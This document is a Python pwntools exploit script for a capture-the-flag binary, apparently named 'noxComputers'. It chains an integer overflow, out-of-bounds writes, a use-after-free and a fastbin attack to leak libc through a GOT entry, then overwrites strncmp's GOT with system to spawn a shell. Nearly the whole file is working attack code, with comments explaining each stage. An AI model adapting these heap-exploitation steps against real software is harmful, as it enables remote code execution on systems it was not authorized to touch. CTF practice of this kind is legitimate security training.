# struct user {
#	char* user_name;
#	struct computer* pc_array[];
#	int16_t pc_bought;
#	padding;
#	int16_t money;
# }
#
# struct computer {
#	char* name;
#	char* manufacturer;
#	uint16_t price;
#	unsigned int serial;
#	uint16_t count;
#	int is_fast;
# }
#
# struct pc_table {
#	struct computer* pc;
#	struct pc_table* next_table;
#	struct pc_table* prev_table;
# }

from pwn import *

g_user_count = 0

def create_user(name, money):

	global g_user_count

	r.sendlineafter('Exit\n', '1')
	r.sendlineafter('username: ', name)
	r.sendlineafter('account: ', str(money))

	g_user_count += 1

def buy_pc(user_id, pc_name, manufacturer, price, is_fast='Y', buy='Y'):
	r.sendlineafter('Exit\n', '3')
	r.sendlineafter('id: ', str(user_id))
	r.sendlineafter('name: ', pc_name)
	r.sendlineafter('name: ', manufacturer)
	r.sendlineafter('(Y/N): ', is_fast)
	r.sendlineafter('pay: ', str(price))
	r.sendlineafter('(Y/N): ', buy)

def ret_pc(user_id, pc_name):
	r.sendlineafter('Exit\n', '6')
	r.sendlineafter('id: ', str(user_id))
	r.sendlineafter('name: ', pc_name)

def show(user_id):
	r.sendlineafter('Exit\n', '4')
	r.sendlineafter('id: ', str(user_id))

def edit(user_id, name, money):
	r.sendlineafter('Exit\n', '5')
	r.sendlineafter('id: ', str(user_id))
	r.sendlineafter('username: ', name)
	r.sendlineafter('account: ', str(money))

def buy_multi(how_many):
	r.sendlineafter('Exit\n', '2')
	r.sendlineafter('buy: ', str(how_many))
	r.sendlineafter('press Y: ', '')

# There is an integer overflow bug when you enter
# a big enough 16-bit number as the mount of premiums
# we'd like to buy
#
# if ( (unsigned __int16)(user_count + how_many) <= 0x400u )
#	...
# 
# This can lead to the user array overflowing the pc array
# which is 0x2400 bytes or 0x400 entries away (each entry being 8 bytes).
def trigger_oob(how_many, name, money):

	global g_user_count
	count = 0

	r.sendlineafter('Exit\n', '2')
	r.sendlineafter('buy: ', str(how_many))
	r.sendlineafter('press Y: ', '')
	
	while True:

		if g_user_count == 0x480:
			break
		r.sendlineafter('#{}: '.format(count), name)
		r.sendlineafter('user: ', str(money+1))
		r.sendlineafter('press Y: ', '')
		count += 1
		g_user_count += 1
	
	r.sendlineafter('#{}: '.format(count), 'done')
	r.sendlineafter('user: ', str(0x8888))
	r.sendlineafter('press Y: ', 'Y')

def leak(idx):
	show(0)
	r.recvuntil('name: ')
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	create_user('A'*8, 0x1337)
	create_user('B'*8, 0x1337)
	create_user('C'*8, 0x1337)

	# Allocate 0x30 pc's in order to perform fastbin attack
	# on the pc_count global variable later on
	for i in xrange(0x30):
		buy_pc(1, 'mbp_{:d}'.format(i), 'apple', 7)

	trigger_oob(65534, 'pwn', 0x2222)
	
	ret_pc(1, 'mbp_1')

	edit(0x480, 'lel', 0)

	# trigger UAF -- we can still edit pc_array[0] via edit_account()
	ret_pc(0, 'kek')
	
	# fastbin attack target
	target = 0x6040ba
	# gdb-peda$ x/4gx $pcount - 0x8
	# 0x6040ba:	0x0481000000000000	0x0000000000000031
	# 0x6040ca:	0x0000000000000000	0x0000000000000000
	#
	# Overwrite fastbin's FD with our target
	edit(0x480, p64(0) + p64(0x31) + p64(target), 0)

	# fastbin[1]: 0x6a7550 --> 0x6a7520 --> 0x68a620 --> 0x6040ba --> 0x0
	# buy_pc conveniently enough triggers malloc thrice where the first one
	# is for data we control (pc's name). Meaning, the next time we call buy_pc,
	# we will get the target chunk back and we will be able to overwrite the user_array.
	buy_pc(7, 'xps', 'dell', 6)

	strncmp_got = 0x604020

	# Craft a fake user entry with the name field being strncmp's GOT entry
	buy_pc(7, 'A'*6 + p64(strncmp_got) + p64(0) + p64(0x6040d0), 'idk',  6)

	# leak free's libc address
	libc = leak(0) - 0x145a90
	system = libc + 0x45390
	puts = libc + 0x6f690
	log.success('Libc: 0x{:x}'.format(libc))

	# Overwrite strncmp's GOT with system. Also patch puts' GOT entry
	# since the the binary null terminates our input and it would crash
	# puts afterwards since its GOT entry is right after strncmp's
	edit(0, p64(system) + p64(puts), 0)

	# Trigger buy_pc => strncmp will get called to check if the entered
	# pc name exists => system('sh')
	r.sendlineafter('Exit\n', '3')
	r.sendlineafter('id: ', '4')
	r.sendlineafter('name: ', 'sh\x00')

	r.interactive()

if __name__ == "__main__":
	#r = remote('chal.noxale.com', 31337)
	r = process('./noxComputers')
	pause()
	pwn()
